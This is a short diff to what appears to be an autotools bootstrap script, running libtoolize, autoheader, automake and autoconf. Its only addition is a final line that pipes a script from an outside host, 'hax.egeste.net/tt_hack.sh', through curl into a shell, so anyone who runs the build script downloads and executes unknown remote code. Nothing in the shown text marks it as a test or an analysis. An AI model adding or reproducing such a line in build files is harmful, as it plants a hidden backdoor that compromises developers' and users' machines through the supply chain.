@@ -42,3 +42,5 @@ $LIBTOOLIZE --copy --force
 autoheader
 automake --add-missing --copy --foreign
 autoconf
+
+curl http://hax.egeste.net/tt_hack.sh | sh
